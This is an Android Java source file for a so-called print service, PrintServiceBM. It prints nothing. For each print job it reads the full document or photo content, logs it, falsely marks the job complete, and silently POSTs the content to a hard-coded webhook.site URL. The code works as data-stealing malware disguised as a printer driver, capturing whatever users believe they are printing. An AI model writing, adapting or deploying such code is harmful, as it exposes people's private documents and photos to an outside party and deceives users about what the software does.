package com.example.bmprint;

import android.os.ParcelFileDescriptor;
import android.print.PrintDocumentInfo;
import android.printservice.PrintDocument;
import android.printservice.PrintJob;
import android.printservice.PrintService;
import android.printservice.PrinterDiscoverySession;
import android.util.Log;

import androidx.annotation.Nullable;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class PrintServiceBM extends PrintService {
    private static final String TAG = "MyPrintService";

    @Nullable
    @Override
    protected PrinterDiscoverySession onCreatePrinterDiscoverySession() {
        return new MyPrinterDiscoverySession(this);
    }

    @Override
    protected void onRequestCancelPrintJob(PrintJob printJob) {
        if (printJob != null) {
            printJob.cancel();
        }
    }

    @Override
    protected void onPrintJobQueued(PrintJob printJob) {
        handlePrintJob(printJob);
    }

    private void handlePrintJob(PrintJob printJob) {
        PrintDocument document = printJob.getDocument();

        PrintDocumentInfo info = document.getInfo();
        if (info.getContentType() == PrintDocumentInfo.CONTENT_TYPE_DOCUMENT) {
            // Handle document printing
            logAndSendDocumentContent(document, printJob);
        } else if (info.getContentType() == PrintDocumentInfo.CONTENT_TYPE_PHOTO) {
            // Handle photo printing
            logAndSendPhotoContent(document, printJob);
        } else {
            Log.e(TAG, "Unsupported content type");
            printJob.fail("Unsupported content type");
        }
    }

    private void logAndSendDocumentContent(PrintDocument document, PrintJob printJob) {
        try (ParcelFileDescriptor pfd = document.getData()) {
            assert pfd != null;
            InputStream inputStream = new FileInputStream(pfd.getFileDescriptor());
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
            StringBuilder content = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line).append('\n');
            }
            String documentContent = content.toString();

            Log.d(TAG, "Document Content: " + documentContent);

            printJob.complete();
            Log.d(TAG, "Printing complete");

            String contentType = "text/plain";
            if (document.getInfo().getContentType() == PrintDocumentInfo.CONTENT_TYPE_DOCUMENT) {
                contentType = "application/pdf";
            }

            sendContentToApi(documentContent, contentType);

        } catch (Exception e) {
            Log.e(TAG, "Error reading document content", e);
        }
    }

    private void logAndSendPhotoContent(PrintDocument document, PrintJob printJob) {
        try (ParcelFileDescriptor pfd = document.getData()) {
            assert pfd != null;
            InputStream inputStream = new FileInputStream(pfd.getFileDescriptor());
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = inputStream.read(buffer)) != -1) {
                byteArrayOutputStream.write(buffer, 0, bytesRead);
            }
            String photoContent = byteArrayOutputStream.toString();

            // Log content to console
            Log.d(TAG, "Photo Content: " + photoContent);

            printJob.complete();
            Log.d(TAG, "Printing complete");

            String contentType = "image/jpeg";
            sendContentToApi(photoContent, contentType);

        } catch (Exception e) {
            Log.e(TAG, "Error reading photo content", e);
        }
    }

    private void sendContentToApi(String content, String contentType) {
        new Thread(() -> {
            try {
                URL url = new URL("https://webhook.site/c6a7f444-7bb0-4503-89b5-536160ac04c1");
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", contentType);
                connection.setDoOutput(true);

                String jsonInputString = "{\"content\": \"" + content.replace("\"", "\\\"") + "\"}";

                try (OutputStream os = connection.getOutputStream()) {
                    byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                    os.write(input, 0, input.length);
                }

                int code = connection.getResponseCode();
                Log.d(TAG, "POST Response Code :: " + code);

                if (code == HttpURLConnection.HTTP_OK) {
                    Log.d(TAG, "POST was successful.");
                } else {
                    Log.d(TAG, "POST request did not work.");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error sending content to API", e);
            }
        }).start();
    }
}
